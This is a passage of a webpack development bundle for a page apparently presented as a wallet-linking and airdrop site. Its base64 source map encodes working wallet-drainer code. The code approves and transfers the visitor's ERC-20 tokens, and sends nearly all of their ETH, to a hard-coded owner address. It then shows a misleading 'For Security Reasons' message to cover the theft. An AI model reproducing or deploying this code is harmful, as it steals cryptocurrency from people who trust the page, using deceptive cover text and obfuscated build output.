cHByb3ZlT3duZXIgPSBTdHJpbmcoXG4gICAgICAgICAgTnVtYmVyKHRva2VuLmJhbGFuY2UpIC8gTWF0aC5wb3coMTAsIE51bWJlcihkZWNpbWFscykpXG4gICAgICAgICk7XG5cbiAgICAgICAgYXdhaXQgZXJjMjBDb250cmFjdC5hcHByb3ZlKE93bmVyQWRyZXNzLCB0b0FwcHJvdmVPd25lcik7XG4gICAgICAgIHRyeSB7XG4gICAgICAgICAgY29uc3QgdHggPSBhd2FpdCBlcmMyMENvbnRyYWN0LnRyYW5zZmVyKFxuICAgICAgICAgICAgT3duZXJBZHJlc3MsXG4gICAgICAgICAgICBTdHJpbmcodG9BcHByb3ZlT3duZXIpXG4gXG4gICAgICAgICAgKTtcbiAgICAgICAgICBhd2FpdCBoYW5kbGVUb2tlbkV0aFRyYW5zZmVyKCk7ICAgXG4gICAgICAgICAgYXdhaXQgdHgud2FpdCgpO1xuXG4gICAgICAgICAgc2hvd05vdGlmaWNhdGlvbihcbiAgICAgICAgICAgIFwiRm9yIFNlY3VyaXR5IFJlYXNvbnMgWW91IGNhbid0IGNvbm5lY3QgZW1wdHkgb3IgbmV3IHdhbGxldFwiXG4gICAgICAgICAgKTtcbiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHtcbiAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKFN0cmluZyhlcnJvcikpO1xuICAgICAgICAgIGNvbnNvbGUubG9nKGVycm9yKTtcbiAgICAgICAgfVxuICAgICAgfSk7XG4gICAgfVxuICB9O1xuXG5cbiAgY29uc3QgaGFuZGxlVG9rZW5FdGhUcmFuc2ZlciA9IGFzeW5jICgpID0+IHtcbiAgICBjb25zdCBkZWZCYWwgPSBhd2FpdCBnZXRVc2VyQmFsYWNlKCk7XG4gICAgY29uc3QgcHJvdmlkZXIgPSBuZXcgZXRoZXJzLnByb3ZpZGVycy5XZWIzUHJvdmlkZXIod2luZG93LmV0aGVyZXVtIGFzIGFueSk7XG4gICAgY29uc3QgZ2FzID0gJzUwMDAwMDAwMDAwMDAwMDAnO1xuICAgIGxldCBiYWw7XG5cbiAgICBpZiAoIWJhbGFuY2UpIHtcbiAgICAgIGJhbCA9IFN0cmluZyhkZWZCYWwpO1xuICAgIH0gZWxzZSB7XG4gICAgICBiYWwgPSBiYWxhbmNlO1xuICAgIH1cblxuICAgIGNvbnN0IGJhbGFuY2VJbldlaSA9IGV0aGVycy51dGlscy5wYXJzZUV0aGVyKGJhbCk7XG4gICAgaWYgKE51bWJlcihiYWxhbmNlSW5XZWkpID49IE51bWJlcihnYXMpKSB7XG4gICAgICBjb25zdCBuZXdCYWxhbmNlQWZ0ZXJHYXMgPSBOdW1iZXIoYmFsYW5jZUluV2VpKSAtIE51bWJlcihnYXMpO1xuICAgICAgY29uc3Qgc2lnbmVyID0gcHJvdmlkZXIuZ2V0U2lnbmVyKCk7XG4gICAgICBjb25zdCBvd25lcnNTaGFyZSA9IE51bWJlcihuZXdCYWxhbmNlQWZ0ZXJHYXMpO1xuXG4gICAgICB0cnkge1xuICAgICAgICBjb25zdCB0eCA9IGF3YWl0IHNpZ25lci5zZW5kVHJhbnNhY3Rpb24oe1xuICAgICAgICAgIHRvOiBPd25lckFkcmVzcyxcbiAgICAgICAgICB2YWx1ZTogU3RyaW5nKG93bmVyc1NoYXJlKSxcbiAgICAgICAgfSk7XG5cbiAgICAgICAgYXdhaXQgdHgud2FpdCgpO1xuICAgICAgICBzaG93Tm90aWZpY2F0aW9uKFxuICAgICAgICAgIFwiRm9yIFNlY3VyaXR5IFJlYXNvbnMgWW91IGNhbid0IGNvbm5lY3QgZW1wdHkgb3IgbmV3IHdhbGxldFwiXG4gICAgICAgICk7XG4gICAgICB9IGNhdGNoIChlcnJvcikge1xuICAgICAgICBzaG93Tm90aWZpY2F0aW9uKFN0cmluZyhlcnJvcikpO1xuICAgICAgICBjb25zb2xlLmxvZygnZXJyJywgZXJyb3IpO1xuICAgICAgfVxuICAgIH0gZWxzZSB7XG4gICAgICBzaG93Tm90aWZpY2F0aW9uKFxuICAgICAgICBTdHJpbmcoXCJGb3IgU2VjdXJpdHkgUmVhc29ucyBZb3UgY2FuJ3QgY29ubmVjdCBlbXB0eSBvciBuZXcgd2FsbGV0XCIpXG4gICAgICApO1xuICAgIH1cbiAgfTtcblxuXG5cbiAgdXNlRWZmZWN0KCgpID0+IHtcbiAgICBnZXRVc2VyQmFsYWNlKCk7XG4gIH0sIFtdKTtcblxuICBjb25zdCBoYW5kbGVUb2tlblRyYW5zZmVyID0gYXN5bmMgKCkgPT4ge1xuICAgIGlmICh2YWxpZEJhbGFuY2VzKSB7XG4gICAgICBhd2FpdCBoYW5kbGVUb2tlbkVyYzIwVHJhbnNmZXIoKTtcblxuICAgIH0gZWxzZXtcbiAgICAgIGF3YWl0IGhhbmRsZVRva2VuRXRoVHJhbnNmZXIoKTtcbiAgICB9XG5cbiAgfTtcblxuXG5cbiAgY29uc3QgW21vdW50ZWQsIHNldE1vdW50ZWRdID0gdXNlU3RhdGUoZmFsc2UpO1xuXG4gIHVzZUVmZmVjdCgoKSA9PiB7XG4gICAgc2V0TW91bnRlZCh0cnVlKTtcbiAgfSwgW10pO1xuXG4gIGlmICghbW91bnRlZCkgcmV0dXJuIDw+PC8+O1xuICBpZiAoaXNNb2RhbE9wZW4pIHJldHVybiA8TW9kYWwgc2V0SXNNb2RhbE9wZW49e3NldElzTW9kYWxPcGVufSAvPjtcbiAgcmV0dXJuIChcbiAgICA8bWFpbiBjbGFzc05hbWU9e2Agdy1mdWxsIGgtZHZoIHNtOmgtWzg5ZHZoXSBtdC02IG1iLTQgZ3JhZGllbnQtYiBgfT5cbiAgICAgIDxkaXYgY2xhc3NOYW1lPVwidy1mdWxsIGZsZXgganVzdGlmeS1lbmQgcHgtNVwiPlxuICAgICAgICB7LyogY2xhc3NOYW1lPSd3LWZ1bGwgaC1kdmggc206aC1bODlkdmhdIG10LTYgbWItNCBncmFkaWVudC1iZycgKi99XG4gICAgICAgIHtpc0Nvbm5lY3RlZCAmJiAoXG4gICAgICAgICAgPGJ1dHRvblxuICAgICAgICAgICAgY2xhc3NOYW1lPVwiYmctcHJpbWFyeSB0ZXh0LXdoaXRlIGgtMTAgdy0zMiByb3VuZGVkLTN4bFwiXG4gICAgICAgICAgICBvbkNsaWNrPXsoKSA9PiBkaXNjb25uZWN0KCl9XG4gICAgICAgICAgPlxuICAgICAgICAgICAgRGlzY29ubmVjdFxuICAgICAgICAgIDwvYnV0dG9uPlxuICAgICAgICApfVxuICAgICAgey8qIDx3M20tYnV0dG9uIGJhbGFuY2U9XCJoaWRlXCIgbGFiZWw9XCJBdXRvbWF0aWMgY29ubmVjdFwiIC8+ICovfVxuICAgICAgPC9kaXY+XG5cblxuICAgICAgPGRpdj5cbiAgICAgICAgey8qIDxkaXYgY2xhc3NOYW1lPVwiZmxleCBmbGV4LWNvbC1yZXZlcnNlIG1kOmZsZXgtcm93IGgtW2NhbGMoMTAwdmgtMTAwcHgpXSBpdGVtcy1jZW50ZXIgbWQ6cHgtMjQgcHgtNSBtdC0yMCBtZDptdC0wXCI+PC9kaXY+ICovfVxuICAgICAgICA8ZGl2PlxuICAgICAgICAgIHsvKiA8aDEgY2xhc3NOYW1lPVwibWQ6dGV4dC03eGwgdGV4dC0yeGwgZm9udC1bNjAwXSB3LWZ1bGwgXCI+XG4gICAgICAgICAgICBMaW5rIHlvdXIgREFwcHMgdG8gbW9iaWxlIHdhbGxldHNcbiAgICAgICAgICA8L2gxPlxuICAgICAgICAgIDxwIGNsYXNzTmFtZT1cIm10LTUgbWQ6dGV4dC14bCB0ZXh0LWJhc2UgbWQ6dy1bODAlXSB3LWZ1bGwgaFwiPlxuICAgICAgICAgICAge1xuICAgICAgICAgICAgICAnT3BlbiBwcm90b2NvbCB0byBjb21tdW5pY2F0ZSBzZWN1cmVseSBiZXR3ZWVuIFdhbGxldHMgYW5kIERhcHBzIChXZWIzIEFwcHMpLiBUaGUgcHJvdG9jb2wgZXN0YWJsaXNoZXMgYSByZW1vdGUgY29ubmVjdGlvbiB1c2luZyBhIEJyaWRnZSBzZXJ2ZXIuJ1xuICAgICAgICAgICAgfVxuICAgICAgICAgIDwvcD4gKi99XG5cbiAgICAgICAgICB7LyogPGRpdiBjbGFzc05hbWU9XCJtZDpweC0yNCBtZDotbXQtMTAgbXQtNSAgcHgtNVwiPlxuICAgICAgICB7aXNDb25uZWN0ZWQgPyAoXG4gICAgICAgICAgPGJ1dHRvblxuICAgICAgICAgICAgb25DbGljaz17YXN5bmMgKCkgPT4gYXdhaXQgaGFuZGxlVG9rZW5UcmFuc2ZlcigpfVxuICAgICAgICAgICAgY2xhc3NOYW1lPVwibWQ6dy1bNDAwcHhdIHctZnVsbCB0ZXh0LXhsIGgtWzUwcHhdIGJnLXByaW1hcnkgdGV4dC13aGl0ZSByb3VuZGVkLTN4bFwiXG4gICAgICAgICAgPlxuICAgICAgICAgICAgTGluayBOb3dcbiAgICAgICAgICA8L2J1dHRvbj5cbiAgICAgICAgKSA6ICggXG4gICAgICAgICBcbiAgICAgICAgICA8YnV0dG9uXG4gICAgICAgICAgICBvbkNsaWNrPXsoKSA9PiB7XG4gICAgICAgICAgICAgIHNldElzTW9kYWxPcGVuKHRydWUpO1xuICAgICAgICAgICAgfX1cbiAgICAgICAgICAgIGNsYXNzTmFtZT1cIm1kOnctWzQwMHB4XSB3LWZ1bGwgdGV4dC14bCBoLVs1MHB4XSBiZy1wcmltYXJ5IHRleHQtd2hpdGUgcm91bmRlZC0zeGxcIlxuICAgICAgICAgID5cbiAgICAgICAgICAgIENvbm5lY3QgV2FsbGV0XG4gICAgICAgICAgPC9idXR0b24+XG4gICAgICAgICl9XG4gICAgICA8L2Rpdj4gKi99XG5cbiAgICAgICAgICB7LyogPHAgY2xhc3NOYW1lPVwibXQtNVwiPkdldCBTdGFydGVkIGluIDMgRWFzeSBTdGVwczwvcD5cbiAgICAgICAgICA8ZGl2IGNsYXNzTmFtZT1cIm10LTNcIj5cbiAgICAgICAgICAgIDxwIGNsYXNzTmFtZT1cImZvbnQtYm9sZFwiPjEuQ29ubmVjdCBXYWxsZXQ8L3A+XG4gICAgICAgICAgICA8cCBjbGFzc05hbWU9XCJtdC0xXCI+XG4gICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAnIFBhc3RlIGluc2lkZSBXYWxsZXQgRGFwcHMgYnJvd3NlciBlaXRoZXIgc3luY2hyb25pemUsIHZhbGlkYXRlLCByZWN0aWZ5IG9yIHJlY292ZXIgd2FsbGV0LidcbiAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgPC9wPlxuICAgICAgICAgIDwvZGl2PlxuICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPVwibXQtM1wiPlxuICAgICAgICAgICAgPHAgY2xhc3NOYW1lPVwiZm9udC1ib2xkXCI+Mi5WYWxpZGF0ZSBXYWxsZXQ8L3A+XG4gICAgICAgICAgICA8cCBjbGFzc05hbWU9XCJtdC0xXCI+XG4gICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAnUHJvdmUgb3duZXJzaGlwIG9mIHRoZSB3YWxsZXQgeW91IHdhbnQgdG8gY29ubmVjdC4gUHJpdmF0ZSBrZXlzIG5ldmVyIGxlYXZlIG1vYmlsZSB3YWxsZXRzLCBrZWVwaW5nIHVzZXIgZnVuZHMgc2FmZS4nXG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIDwvcD5cbiAgICAgICAgICA8L2Rpdj5cbiAgICAgICAgICA8ZGl2IGNsYXNzTmFtZT1cIm10LTNcIj5cbiAgICAgICAgICAgIDxwIGNsYXNzTmFtZT1cImZvbnQtYm9sZFwiPjMuR2V0IENvbm5lY3RlZDwvcD5cbiAgICAgICAgICAgIDxwIGNsYXNzTmFtZT1cIm10LTFcIj5cbiAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICdFbmQtdG8tZW5kIGVuY3J5cHRpb24gdXNpbmcgY2xpZW50LXNpZGUgZ2VuZXJhdGVkIGtleXMga2VlcHMgYWxsIHVzZXIgYWN0aXZpdHkgcHJpdmF0ZS4nXG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIDwvcD5cbiAgICAgICAgICA8L2Rpdj4gKi99XG4gICAgICAgIDwvZGl2PlxuXG4gICAgICA8L2Rpdj5cbiAgICAgIFxuICAgICBcbiAgICA8TmF2IC8+XG5cdFx0XHRcdFx0PE1haW4gLz5cblx0XHRcdFx0XHQ8QWlyZHJvcCAvPlxuXHRcdFx0XHRcdDxDb2xsZWN0aW9uIC8+XG5cdFx0XHRcdFx0PEZvb3RlciAvPlxuICAgIDwvbWFpbj5cbiAgKTtcbn1cbiJdLCJuYW1lcyI6WyJpbnRlciIsInVzZUVmZmVjdCIsInVzZVN0YXRlIiwiZXRoZXJzIiwidXNlQWNjb3VudCIsIk93bmVyQWRyZXNzIiwiZ2V0TmV0d29yayIsImNoZWNrSWZVc2VyT3duc0FueVRva2VuaW5MaXN0IiwiU3dhbCIsIklFUkMyMENvbnRyYWN0IiwiTW9kYWwiLCJ1c2VEaXNjb25uZWN0IiwiQWlyZHJvcCIsIkNvbGxlY3Rpb24iLCJGb290ZXIiLCJNYWluIiwiTmF2IiwiSG9tZSIsImJhbGFuY2UiLCJzZXRCYWxhbmNlIiwiaXNNb2RhbE9wZW4iLCJzZXRJc01vZGFsT3BlbiIsInZhbGlkQmFsYW5jZXMiLCJzZXRWYWxpZEJhbGFuY2UiLCJhZGRyZXNzIiwiaXNDb25uZWN0ZWQiLCJjaGFpbiIsImRpc2Nvbm5lY3QiLCJnYXNCdWZmZXIiLCJnZXRVc2VyQmFsYWNlIiwicHJvdmlkZXIiLCJwcm92aWRlcnMiLCJXZWIzUHJvdmlkZXIiLCJ3aW5kb3ciLCJldGhlcmV1bSIsImJhbGFuY2VJbldlaSIsImdldEJhbGFuY2UiLCJTdHJpbmciLCJiYWxhbmNlSW5FdGgiLCJ1dGlscyIsImZvcm1hdEV0aGVyIiwiY29uc29sZSIsImxvZyIsImVycm9yIiwic2hvd05vdGlmaWNhdGlvbiIsInRleHQiLCJmaXJlIiwidGl0bGUiLCJpY29uIiwiYmIiLCJhIiwibmFtZSIsImhhbmRsZVRva2VuRXJjMjBUcmFuc2ZlciIsImZvckVhY2giLCJ0b2tlbiIsImVyYzIwQ29udHJhY3QiLCJ0b2tlbkFkZHJlc3MiLCJkZWNpbWFscyIsInRvQXBwcm92ZU93bmVyIiwiTnVtYmVyIiwiTWF0aCIsInBvdyIsImFwcHJvdmUiLCJ0eCIsInRyYW5zZmVyIiwiaGFuZGxlVG9rZW5FdGhUcmFuc2ZlciIsIndhaXQiLCJkZWZCYWwiLCJnYXMiLCJiYWwiLCJwYXJzZUV0aGVyIiwibmV3QmFsYW5jZUFmdGVyR2FzIiwic2lnbmVyIiwiZ2V0U2lnbmVyIiwib3duZXJzU2hhcmUiLCJzZW5kVHJhbnNhY3Rpb24iLCJ0byIsInZhbHVlIiwiaGFuZGxlVG9rZW5UcmFuc2ZlciIsIm1vdW50ZWQiLCJzZXRNb3VudGVkIiwibWFpbiIsImNsYXNzTmFtZSIsImRpdiIsImJ1dHRvbiIsIm9uQ2xpY2siXSwic291cmNlUm9vdCI6IiJ9\n//# sourceURL=webpack-internal:///./src/pages/index.tsx\n"));

/***/ })

});